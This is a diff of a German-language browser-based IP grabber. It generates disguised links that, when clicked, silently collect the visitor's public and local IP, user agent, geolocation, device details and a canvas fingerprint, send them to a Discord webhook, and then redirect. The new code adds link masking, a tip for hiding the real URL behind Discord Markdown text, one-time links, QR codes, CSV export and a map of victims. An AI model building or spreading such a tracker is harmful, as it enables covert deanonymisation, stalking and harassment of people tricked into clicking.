-                const localIP=settings.collectLocalIP?await fetchLocalIP():null;
-                const ua=settings.collectUA?navigator.userAgent:null;
-                const location=settings.collectLocation?await fetchLocation(publicIP):null;
-                
-                sendDiscord(webhookUrl,publicIP,localIP,ua,location,linkId,customMsg,label);
-                
-                if(settings.storeLocal){
-                    const logEntry={id:generateId(),publicIP,localIP,ua,location,label,linkId,timestamp:new Date().toISOString()};
-                    ipLogs.push(logEntry);saveLogs();
-                    const link=links.find(l=>l.id===linkId);
-                    if(link){link.clicks++;link.lastAccess=new Date().toISOString();saveLinks();}
-                }
-                
-                // Weiterleitungsseite mit Debug-Info
-                let debugHTML = '';
-                if(debug){
-                    debugHTML = `<div style="margin-top:20px; background:#1e293b; padding:16px; border-radius:12px; text-align:left;">
-                        <strong>Debug-Info:</strong><br>
-                        Öffentliche IP: ${publicIP}<br>
-                        Lokale IP: ${localIP || 'nicht erfasst'}<br>
-                        WebRTC-Status: ${webRTCStatusMessage}<br>
-                        Standort: ${location || 'aus'}<br>
-                        Label: ${label || 'keine'}<br>
-                        User-Agent: ${ua || 'aus'}
-                    </div>`;
-                }
-                
-                document.body.innerHTML=`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#e2e8f0;font-family:system-ui;"><div style="text-align:center;"><h2>Weiterleitung...</h2><div style="width:50px;height:50px;border:5px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>${debugHTML}</div></div>`;
-                document.body.style.visibility='visible';
-                setTimeout(()=>{window.location.href=target;},settings.delay);
                 return true;
+            }catch(e){ return false; }
+        }
+
+        // ---------- REDIRECT HANDLER ----------
+        async function handleRedirect(){
+            const params = new URLSearchParams(window.location.search);
+            const linkId = params.get('id');
+            if(!linkId) return false;
+            // Entpacken des Links
+            const encodedWh = params.get('wh');
+            const targetEnc = params.get('to');
+            const msgEnc = params.get('msg');
+            const lblEnc = params.get('lbl');
+            const once = params.get('once') === '1';
+            const expires = params.get('expires');
+            const debug = params.get('debug') === '1';
+            // Einstellungen aus dem Link (überschreiben globale Einstellungen)
+            const linkSettings = {
+                collectUA: params.get('ua') !== '0',
+                collectLocation: params.get('loc') === '1',
+                collectLocalIP: params.get('lip') === '1',
+                collectIPType: params.get('ipt') === '1',
+                collectDevice: params.get('dev') === '1',
+                collectFingerprint: params.get('fp') === '1',
+                detectBot: params.get('bot') === '1'
+            };
+            Object.assign(settings, linkSettings);
+
+            if(!encodedWh || !targetEnc) return false;
+            const webhookUrl = base64Decode(encodedWh);
+            let target = base64Decode(targetEnc);
+            const customMsg = msgEnc ? base64Decode(msgEnc) : '';
+            const label = lblEnc ? base64Decode(lblEnc) : '';
+
+            // Einmal-Link-Prüfung
+            if(once){
+                const used = JSON.parse(localStorage.getItem('ipg_used_links')||'[]');
+                if(used.includes(linkId)){
+                    document.body.innerHTML = '<h2>Dieser Link wurde bereits verwendet.</h2>';
+                    document.body.style.visibility = 'visible';
+                    return true;
+                }
+                used.push(linkId);
+                localStorage.setItem('ipg_used_links', JSON.stringify(used));
+            }
+            // Ablaufdatum
+            if(expires){
+                const expDate = new Date(expires);
+                if(Date.now() > expDate.getTime()){
+                    document.body.innerHTML = '<h2>Dieser Link ist abgelaufen.</h2>';
+                    document.body.style.visibility = 'visible';
+                    return true;
+                }
+            }
+            // Mehrere Ziele
+            const multiTargets = params.get('multi');
+            if(multiTargets){
+                const urls = JSON.parse(base64Decode(multiTargets));
+                if(urls.length){
+                    const mode = params.get('mode')||'random';
+                    if(mode === 'random') target = urls[Math.floor(Math.random()*urls.length)];
+                    else {
+                        const idx = parseInt(params.get('seq')||'0');
+                        target = urls[idx % urls.length];
+                    }
+                }
             }
 
-            // ---------- ADMIN PANEL ----------
-            function showAdminPanel(){
-                document.getElementById('adminPanel').style.display='block';
-                document.body.classList.add('admin-mode');
-                document.body.style.visibility='visible';
-                initAdminUI();
-                renderLogs();
-                const presetSelect=document.getElementById('maskPreset');
-                const customContainer=document.getElementById('customMaskContainer');
-                presetSelect.addEventListener('change',()=>{
-                    customContainer.style.display=presetSelect.value==='custom'?'block':'none';
-                });
-                checkWebRTCSupport();
-            }
-            function renderLogs(){
-                const tbody=document.getElementById('logsBody');
-                if(!tbody)return;
-                if(!ipLogs.length){tbody.innerHTML='<tr><td colspan="5">Keine Logs</td></tr>';return;}
-                tbody.innerHTML=[...ipLogs].reverse().map(l=>`<tr><td>${l.publicIP||l.ip||'-'}</td><td>${l.localIP||'-'}</td><td>${formatDate(l.timestamp)}</td><td>${l.ua?.substring(0,30)||'-'}</td><td>${l.linkId.slice(-6)}</td></tr>`).join('');
-            }
-            function initAdminUI(){
-                document.querySelectorAll('.tab').forEach(t=>{t.addEventListener('click',()=>{document.querySelectorAll('.tab,.tab-content').forEach(el=>el.classList.remove('active'));t.classList.add('active');document.getElementById(t.dataset.tab).classList.add('active');})});
-                
-                document.getElementById('generateBtn').addEventListener('click',()=>{
-                    const target = document.getElementById('targetUrl').value.trim();
-                    const webhook = document.getElementById('webhookInput').value.trim();
-                    if(!target||!webhook){alert('Ziel-URL und Webhook erforderlich');return;}
-                    if(!webhook.includes('discord.com/api/webhooks')){alert('Ungültige Webhook-URL');return;}
-                    
-                    const customMsg = document.getElementById('customMsg').value.trim();
-                    const label = document.getElementById('labelInput').value.trim();
-                    const embedTarget = document.getElementById('embedTargetInMask').checked;
-                    const linkId = generateId();
-                    let base = document.getElementById('baseUrlInput').value.trim();
-                    if(!base) base = settings.defaultBase;
-                    if(!base) base = window.location.origin + window.location.pathname;
-                    if(!base.endsWith('/') && !base.includes('?')) base += '/';
-                    
-                    let maskedUrl = '';
-                    const preset = document.getElementById('maskPreset').value;
-                    const path = document.getElementById('maskPath').value.trim();
-                    
-                    if(preset === 'custom'){
-                        maskedUrl = document.getElementById('customMaskUrl').value.trim();
-                    } else if(preset){
-                        maskedUrl = preset;
-                    }
-                    
-                    if(maskedUrl){
-                        if(path) maskedUrl += path;
-                        if(embedTarget){
-                            const separator = maskedUrl.includes('?') ? '&' : '?';
-                            maskedUrl += separator + 'url=' + encodeURIComponent(target);
-                        }
-                    }
-                    
-                    const encodedWh = base64Encode(webhook);
-                    const params = new URLSearchParams();
-                    params.set('id', linkId);
-                    params.set('to', target);
-                    params.set('wh', encodedWh);
-                    if(customMsg) params.set('msg', base64Encode(customMsg));
-                    if(label) params.set('lbl', base64Encode(label));
-                    const realUrl = base + (base.includes('?')?'&':'?') + params.toString();
-                    
-                    const newLink = {id:linkId, target, webhook, customMsg, label, maskedUrl: maskedUrl||null, clicks:0, lastAccess:null};
-                    links.push(newLink); saveLinks();
-                    
-                    document.getElementById('resultPanel').style.display = 'block';
-                    document.getElementById('realUrlDisplay').textContent = realUrl;
-                    document.getElementById('maskedUrlDisplay').textContent = maskedUrl || realUrl;
-                    document.getElementById('linkIdDisplay').textContent = linkId;
-                    currentLinkId = linkId;
-                    document.getElementById('clickCount').textContent = '0';
-                    document.getElementById('lastAccess').textContent = '—';
-                });
-                
-                document.getElementById('copyMaskedBtn').addEventListener('click',()=>navigator.clipboard?.writeText(document.getElementById('maskedUrlDisplay').textContent).then(()=>alert('Tarn‑Link kopiert!')));
-                document.getElementById('copyRealBtn').addEventListener('click',()=>navigator.clipboard?.writeText(document.getElementById('realUrlDisplay').textContent).then(()=>alert('Echter Link kopiert!')));
-                document.getElementById('testOwnBtn').addEventListener('click',()=>{
-                    if(!currentLinkId) return alert('Kein Link generiert.');
-                    window.open(document.getElementById('realUrlDisplay').textContent+'&debug=1','_blank');
-                });
-                document.getElementById('testWebhookBtn').addEventListener('click',async()=>{
-                    const wh = document.getElementById('webhookInput').value.trim();
-                    if(!wh) return alert('Webhook eingeben');
-                    const ok = await sendDiscord(wh, 'Test-Public', 'Test-Local', 'Test-UA', 'Test-Standort', 'test', 'Testnachricht', 'TestLabel');
-                    document.getElementById('testResult').textContent = ok ? '✅ Erfolg' : '❌ Fehler';
-                });
-                
-                document.getElementById('clearLogsBtn').addEventListener('click',()=>{ipLogs=[]; saveLogs(); renderLogs();});
-                document.getElementById('saveSettingsBtn').addEventListener('click',saveSettings);
-            }
+            const publicIP = await fetchPublicIP();
+            const localIP = settings.collectLocalIP ? await fetchLocalIP() : null;
+            const ua = settings.collectUA ? navigator.userAgent : null;
+            const location = settings.collectLocation ? await fetchLocation(publicIP) : null;
+            const ipType = settings.collectIPType ? await fetchIPType(publicIP) : null;
+            const device = settings.collectDevice ? getDeviceInfo() : null;
+            const fingerprint = settings.collectFingerprint ? await getCanvasFingerprint() : null;
+            const bot = settings.detectBot ? isBot(ua||'') : false;
 
-            // ---------- START ----------
-            loadStorage();
-            (async function(){if(!(await handleRedirect())) showAdminPanel();})();
+            const logEntry = {
+                id: generateId(),
+                publicIP, localIP, ua, location, ipType, device, fingerprint, bot, label, linkId,
+                timestamp: new Date().toISOString()
+            };
+            if(settings.storeLocal){
+                ipLogs.push(logEntry);
+                saveLogs();
+                const link = links.find(l => l.id === linkId);
+                if(link){ link.clicks = (link.clicks||0)+1; link.lastAccess = new Date().toISOString(); saveLinks(); }
+            }
+            sendDiscord(webhookUrl, { publicIP, localIP, ua, location, ipType, device, fingerprint, bot, customMsg, label, linkId });
+
+            // Angepasste Ladeanimation
+            const loaderText = params.get('loaderText') ? base64Decode(params.get('loaderText')) : 'Weiterleitung...';
+            const loaderGif = params.get('loaderGif') ? base64Decode(params.get('loaderGif')) : null;
+            let innerHtml = `<h2>${loaderText}</h2>`;
+            if(loaderGif) innerHtml = `<img src="${loaderGif}" style="max-width:200px; margin:20px;">` + innerHtml;
+            else innerHtml += `<div style="width:50px;height:50px;border:5px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div>`;
+            document.body.innerHTML = `<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#e2e8f0;font-family:system-ui;"><div style="text-align:center;">${innerHtml}${debug?`<div style="margin-top:20px;background:#1e293b;padding:16px;border-radius:12px;"><strong>Debug:</strong><br>Öffentlich: ${publicIP}<br>Lokal: ${localIP||'aus'}<br>IP‑Typ: ${ipType||'aus'}<br>Fingerprint: ${fingerprint||'aus'}<br>Bot: ${bot}</div>`:''}</div></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>`;
+            document.body.style.visibility = 'visible';
+            setTimeout(() => { window.location.href = target; }, settings.delay);
+            return true;
+        }
+
+        // ---------- ADMIN UI ----------
+        function updateModeUI(){
+            const mode = document.getElementById('redirectMode').value;
+            document.getElementById('targetUrl').style.display = mode === 'single' ? 'block' : 'none';
+            document.getElementById('multiTargetContainer').style.display = mode === 'single' ? 'none' : 'block';
+            document.getElementById('linkValidity').parentElement.style.display = 'flex';
+        }
+        function initAdminUI(){
+            // Tabs
+            document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', function(){
+                document.querySelectorAll('.tab,.tab-content').forEach(e => e.classList.remove('active'));
+                this.classList.add('active');
+                document.getElementById(this.dataset.tab).classList.add('active');
+                if(this.dataset.tab === 'logs') {
+                    renderLogsTable();
+                    showMap();
+                }
+            }));
+            // Generator Events
+            document.getElementById('redirectMode').addEventListener('change', updateModeUI);
+            document.getElementById('linkValidity').addEventListener('change', function(){
+                document.getElementById('validUntil').style.display = this.value === 'date' ? 'inline-block' : 'none';
+            });
+            document.getElementById('maskPreset').addEventListener('change', function(){
+                document.getElementById('customMaskContainer').style.display = this.value === 'custom' ? 'block' : 'none';
+            });
+            document.getElementById('generateBtn').addEventListener('click', async () => {
+                const webhook = document.getElementById('webhookInput').value.trim();
+                if(!webhook || !webhook.includes('discord.com/api/webhooks')) return alert('Gültige Discord Webhook URL erforderlich');
+                let base = document.getElementById('baseUrlInput').value.trim() || settings.defaultBase;
+                if(!base) base = window.location.origin + window.location.pathname;
+                if(!base.endsWith('/') && !base.includes('?')) base += '/';
+
+                const linkId = generateId();
+                const targetMode = document.getElementById('redirectMode').value;
+                let targetUrls = [];
+                let finalTargetEnc = '';
+                if(targetMode === 'single'){
+                    const single = document.getElementById('targetUrl').value.trim();
+                    if(!single) return alert('Ziel‑URL eingeben');
+                    targetUrls = [single];
+                    finalTargetEnc = base64Encode(single);
+                } else {
+                    const multi = document.getElementById('multiTargets').value.trim().split('\n').filter(u => u.trim());
+                    if(multi.length === 0) return alert('Mindestens eine Ziel‑URL eingeben');
+                    targetUrls = multi;
+                    finalTargetEnc = base64Encode(targetUrls[0]); // default
+                }
+
+                const params = new URLSearchParams();
+                params.set('id', linkId);
+                params.set('wh', base64Encode(webhook));
+                params.set('to', finalTargetEnc);
+                const customMsg = document.getElementById('customMsg').value.trim();
+                if(customMsg) params.set('msg', base64Encode(customMsg));
+                const label = document.getElementById('labelInput').value.trim();
+                if(label) params.set('lbl', base64Encode(label));
+
+                // Gültigkeit
+                const validity = document.getElementById('linkValidity').value;
+                if(validity === 'once') params.set('once', '1');
+                else if(validity === 'date'){
+                    const until = document.getElementById('validUntil').value;
+                    if(until) params.set('expires', until);
+                }
+
+                // Mehrere Ziele
+                if(targetMode !== 'single'){
+                    params.set('multi', base64Encode(JSON.stringify(targetUrls)));
+                    params.set('mode', targetMode);
+                }
+
+                // Einstellungen in Link kodieren
+                params.set('ua', settings.collectUA ? '1' : '0');
+                params.set('loc', settings.collectLocation ? '1' : '0');
+                params.set('lip', settings.collectLocalIP ? '1' : '0');
+                params.set('ipt', settings.collectIPType ? '1' : '0');
+                params.set('dev', settings.collectDevice ? '1' : '0');
+                params.set('fp', settings.collectFingerprint ? '1' : '0');
+                params.set('bot', settings.detectBot ? '1' : '0');
+
+                // Ladeanimation
+                const loaderText = document.getElementById('customLoaderText').value.trim();
+                if(loaderText) params.set('loaderText', base64Encode(loaderText));
+                const loaderGif = document.getElementById('customLoaderGif').value.trim();
+                if(loaderGif) params.set('loaderGif', base64Encode(loaderGif));
+
+                const finalUrl = base + (base.includes('?')?'&':'?') + params.toString();
+                document.getElementById('finalUrlDisplay').textContent = finalUrl;
+                document.getElementById('linkIdDisplay').textContent = linkId;
+                currentLinkId = linkId;
+                document.getElementById('resultPanel').style.display = 'block';
+                document.getElementById('clickCount').textContent = '0';
+                document.getElementById('lastAccess').textContent = '—';
+
+                // QR Code
+                const qrContainer = document.getElementById('qrContainer');
+                qrContainer.innerHTML = '';
+                new QRCode(qrContainer, { text: finalUrl, width: 128, height: 128 });
+
+                // Masked Text Tipp
+                const preset = document.getElementById('maskPreset').value;
+                let maskedText = '';
+                if(preset === 'custom') maskedText = document.getElementById('customMaskUrl').value.trim();
+                else if(preset) maskedText = preset;
+                if(maskedText){
+                    const note = document.createElement('div');
+                    note.className = 'mask-note';
+                    note.innerHTML = `💡 <strong>Discord‑Tipp:</strong> Schreibe <code>[${maskedText}](${finalUrl})</code>`;
+                    document.getElementById('resultPanel').appendChild(note);
+                }
+
+                const newLink = { id: linkId, target: targetUrls[0], webhook, customMsg, label, clicks:0, lastAccess:null };
+                links.push(newLink);
+                saveLinks();
+            });
+
+            document.getElementById('copyFinalBtn').addEventListener('click', () => {
+                navigator.clipboard.writeText(document.getElementById('finalUrlDisplay').textContent).then(() => alert('Link kopiert!'));
+            });
+            document.getElementById('testOwnBtn').addEventListener('click', () => {
+                if(!currentLinkId) return alert('Kein Link generiert.');
+                window.open(document.getElementById('finalUrlDisplay').textContent + '&debug=1', '_blank');
+            });
+            document.getElementById('testWebhookBtn').addEventListener('click', async () => {
+                const wh = document.getElementById('webhookInput').value.trim();
+                if(!wh) return alert('Webhook eingeben');
+                const ok = await sendDiscord(wh, { publicIP:'Test', ua:'Test', linkId:'test', customMsg:'Test', label:'Test' });
+                document.getElementById('testResult').textContent = ok ? '✅ Erfolg' : '❌ Fehler';
+            });
+
+            document.getElementById('clearLogsBtn').addEventListener('click', () => {
+                ipLogs = [];
+                saveLogs();
+                renderLogsTable();
+                showMap();
+            });
+            document.getElementById('exportCsvBtn').addEventListener('click', exportCSV);
+            document.getElementById('saveSettingsBtn').addEventListener('click', () => {
+                saveSettingsToStorage();
+                alert('Einstellungen gespeichert.');
+            });
+            updateModeUI();
+            renderLogsTable();
+        }
+
+        function renderLogsTable(){
+            const tbody = document.getElementById('logsBody');
+            if(!tbody) return;
+            if(ipLogs.length === 0){
+                tbody.innerHTML = '<tr><td colspan="6">Keine Logs</td></tr>';
+                return;
+            }
+            tbody.innerHTML = ipLogs.slice().reverse().map(log => `
+                <tr>
+                    <td>${log.publicIP||'-'}</td>
+                    <td>${log.ipType||'-'}</td>
+                    <td>${log.device ? log.device.screen+'<br>'+log.device.timezone : '-'}</td>
+                    <td>${log.fingerprint||'-'}</td>
+                    <td>${formatDate(log.timestamp)}</td>
+                    <td>${log.bot ? '🤖' : '👤'}</td>
+                </tr>
+            `).join('');
+        }
+
+        function exportCSV(){
+            if(ipLogs.length === 0) return alert('Keine Daten zum Exportieren.');
+            let csv = 'IP,Typ,Gerät,Fingerprint,Zeit,Bot\n';
+            ipLogs.forEach(log => {
+                csv += `${log.publicIP},${log.ipType||''},${log.device?.screen||''},${log.fingerprint||''},${log.timestamp},${log.bot?'Bot':'User'}\n`;
+            });
+            const blob = new Blob([csv], {type:'text/csv'});
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'ip_logs.csv';
+            a.click();
+        }
+
+        let mapInstance = null;
+        function showMap(){
+            const mapDiv = document.getElementById('map');
+            if(!mapDiv || !settings.collectLocation) return;
+            const lastWithLocation = ipLogs.filter(log => log.location && log.location.lat).slice(-1)[0];
+            if(!lastWithLocation) return;
+            if(!mapInstance){
+                mapInstance = L.map('map').setView([lastWithLocation.location.lat, lastWithLocation.location.lon], 13);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: 'OSM' }).addTo(mapInstance);
+            }
+            mapInstance.setView([lastWithLocation.location.lat, lastWithLocation.location.lon], 13);
+            if(mapInstance._marker) mapInstance.removeLayer(mapInstance._marker);
+            mapInstance._marker = L.marker([lastWithLocation.location.lat, lastWithLocation.location.lon]).addTo(mapInstance)
+                .bindPopup(`${lastWithLocation.publicIP}<br>${lastWithLocation.location.text}`).openPopup();
+        }
+
+        // ---------- START ----------
+        loadStorage();
+        (async function(){
+            if(await handleRedirect()) return;
+            document.getElementById('adminPanel').style.display = 'block';
+            document.body.classList.add('admin-mode');
+            document.body.style.visibility = 'visible';
+            initAdminUI();
+            showMap();
         })();
+    })();
     </script>
 </body>
 </html>
